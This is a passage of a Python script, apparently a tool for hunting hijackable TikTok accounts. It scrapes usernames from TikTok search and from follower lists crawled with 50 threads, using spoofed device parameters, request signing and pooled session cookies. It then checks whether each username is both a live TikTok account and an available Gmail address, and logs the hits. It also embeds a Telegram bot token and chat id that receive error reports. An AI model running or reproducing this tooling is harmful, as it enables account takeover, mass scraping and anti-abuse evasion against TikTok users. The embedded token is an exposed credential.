            'history_len': '3',
            'is_fullscreen': 'false',
            'is_page_visible': 'true',
            'keyword': user,
            'odinId': '73' + ''.join(random.choices('0123456789', k=16)),
            'os': 'linux',
            'priority_region': '',
            'referer': '',
            'region': 'DE',
            'screen_height': '780',
            'screen_width': '360',
            'tz_name': 'Asia/Aden',
            'user_is_login': 'false',
            'webcast_language': 'ar',
        }

        headers = {
            'authority': 'www.tiktok.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'referer': f'https://www.tiktok.com/search?q={user}&t={str(int(time.time()*1000))}',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': agent,
        }

        async with ses.get(
            'https://www.tiktok.com/api/search/general/preview/',
            params=params,
            headers=headers
        ) as r:
            try:
                res = await r.json()
            except:
                return

        if 'sug_list' in res:
            for users in res['sug_list']:
                email =users['content'].replace(" ", "")
                #email='beyoglluecrin'
                CheckTik = await Tik(email, ses)      
                if CheckTik == True:
                    gt += 1
                    await lo(email)
                    CheckGm = await gm(email) 
                    if CheckGm == {'status': 'Good', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:
                        
                        h += 1
                        await lo(email)
                        await inf(email,ses,h)
                    elif CheckGm == {'status': 'Bad', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:
                        bg += 1
                        await lo(email)
                    else:
                        bhhw=Gmail.CheckGmail(email)
                        if bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Good'}:
                        	h+=1
                        	await inf(email,ses,h)
                        	await lo(email)
                        elif bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Bad'}:
                        	bg+=1
                        	await lo(email)
                        else:
                        	blog += 1
                        	await lo(email)
                elif CheckTik == False:
                    bt += 1
                    await lo(email)
                elif CheckTik == None:
                    sese += 1
                    await lo(email)
                else:
                    blo += 1
                    await lo(email)
async def clean_emails(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()

    uniq = sorted(set([i.strip() for i in lines if i.strip() != ""]))

    with open(file_path, 'w') as f:
        for email in uniq:
            f.write(email + "\n")
    return uniq
async def remove_email(file_path, email_to_remove):
    with open(file_path, 'r') as f:
        lines = f.readlines()
    with open(file_path, 'w') as f:
        for line in lines:
            if line.strip() != email_to_remove:
                f.write(line)
async def s1(email, ses, file_path):
  try:
    global h, gt, bg, bt, blog, blo, sese
    CheckTik = await Tik(email, ses)
    if CheckTik ==True:
        gt += 1
        await lo(email)
        CheckGm = await gm(email)
        await remove_email(file_path, email)
        if CheckGm == {'status': 'Good', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:                                  
                        h += 1
                        await lo(email)
                        await inf(email,ses,h)     
        elif CheckGm == {'status': 'Bad', 'Dev': 'Mustafa', 'Telegram': '@D_B_HH'}:
        	bg+=1
        	await lo(email)
        else:
                        bhhw=Gmail.CheckGmail(email)
                        if bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Good'}:
                        	
                        	h+=1
                        	await inf(email,ses,h)
                        	await lo(email)
                        elif bhhw=={'Programmer': 'Ibn_Suleiman', 'Check': 'Bad'}:
                        	bg+=1
                        	await lo(email)
                        else:
                        	blog += 1
                        	await lo(email)
    elif CheckTik == False:
        await remove_email(file_path, email)
        bt += 1
        await lo(email)
    elif CheckTik == None:
        sese += 1
        await lo(email)
    else:
        blo += 1
        await lo(email)
  except Exception as eer:
  	requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={eer}')
import requests
import threading
from queue import Queue
from TikSign import *
from colorama import init, Fore

init(autoreset=True)

output_file = "MustafaList.txt"
visited = set()
queue = Queue()
counter = 1
lock = threading.Lock()


def fetch_user(username):
    try:
        response = requests.get(
            f'https://www.tiktok.com/@{username}',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept-Language': 'en-US,en;q=0.9'
            },
            timeout=10
        ).text

        data1 = response.split('"userInfo":{"user":')[1].split('}</script>')[0]
        user_id = data1.split('"id":"')[1].split('"')[0]
        sec_user_id = data1.split('"secUid":"')[1].split('"')[0]
        return user_id, sec_user_id
    except:
        return None, None


def worker():
    global counter
    while True:
        username = queue.get()
        if username in visited:
            queue.task_done()
            continue

        visited.add(username)

        user_id, sec_user_id = fetch_user(username)
        if not user_id:
            queue.task_done()
            continue

        params = {
            "user_id": user_id,
            "count": "100",
            "page_token": "",
            "source_type": "4",
            "request_tag_from": "h5",
            "sec_user_id": sec_user_id,
            "manifest_version_code": "400603",
            "_rticket": "1763718767244",
            "app_language": "en",
            "app_type": "normal",
            "iid": "7546917635566356231",
            "app_package": "com.zhiliaoapp.musically.go",
            "channel": "googleplay",
            "device_type": "TECNO CL6",
            "language": "en",
            "host_abi": "arm64-v8a",
            "locale": "en",
            "resolution": "1080*2436",
            "openudid": "c63764221a4abb54",
            "update_version_code": "400603",
            "ac2": "wifi",
            "cdid": "ac0e559c-f9cd-4894-b890-393ea72405df",
            "sys_region": "US",
            "os_api": "35",
            "timezone_name": "Asia/Baghdad",
            "dpi": "480",
            "carrier_region": "IQ",
            "ac": "wifi",
            "device_id": "7388587736934598161",
            "os": "android",
            "os_version": "15",
            "timezone_offset": "10800",
            "version_code": "400603",
            "app_name": "musically_go",
            "ab_version": "40.6.3",
            "version_name": "40.6.3",
            "device_brand": "TECNO",
            "op_region": "IQ",
            "ssmix": "a",
            "device_platform": "android",
            "build_number": "40.6.3",
            "region": "US",
            "aid": "1340",
            "ts": "1763718687"
        }

        params.update(Newparams())
        ss = sign(params=params, version='8404')
        si=random.choice(lin);headers = {
            'User-Agent': "com.zhiliaoapp.musically.go/400603 (Linux; U; Android 15; en_US; TECNO CL6; Build/AP3A.240905.015.A2;tt-ok/3.12.13.44.lite-ul)",
            'Cookie': f"sid_tt={si}; sessionid={si}; sessionid_ss={si}"
        }
        headers.update(ss)

        page_token = ""

        while True:
            params["page_token"] = page_token
            try:
                r = requests.get(
                    "https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/follower/list/",
                    headers=headers,
                    params=params,
                    timeout=10
                ).json()
            except:
                break

            followers = r.get("followers", [])
            if not followers:
                break

            for user in followers:
                uname = user.get("unique_id")

                with lock:
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(uname + "\n")

                    print(Fore.GREEN+f"<{counter}>"+Fore.RESET +
                          "~~["+Fore.RED+uname+Fore.RESET+"]")

                    counter += 1

                if uname not in visited:
                    queue.put(uname)

            page_token = r.get("next_page_token", "")
            if not page_token:
                break

        queue.task_done()


def mainlist():
    username = input("Start Username: ")
    queue.put(username)

    for _ in range(50):
        threading.Thread(target=worker, daemon=True).start()

    queue.join()


#main()
            
#````````````°````````°`````
async def main1():
    file_path ='MustafaList.txt'
    emails = await clean_emails(file_path)
    semaphore = asyncio.Semaphore(50)
    async with aiohttp.ClientSession() as ses:
        async def sem_task(email):
            async with semaphore:
                await s1(email, ses, file_path)
        tasks = [asyncio.create_task(sem_task(email)) for email in emails]
        await asyncio.gather(*tasks)
async def mainn():
    kh = input('1.Random </> 2.From File </> 3.GetList: ')
    if kh == '1':
        while True:
            try:
                tasks = [asyncio.create_task(s()) for _ in range(20)]
                await asyncio.gather(*tasks)
            except Exception as ee:
                pass
                pass
    elif kh == '2':
      try:
        await main1()
      except Exception as ee16:
                print(ee16)
    elif kh=='3':
    	try:mainlist()
    	except Exception as ee1:
                pass
asyncio.run(mainn())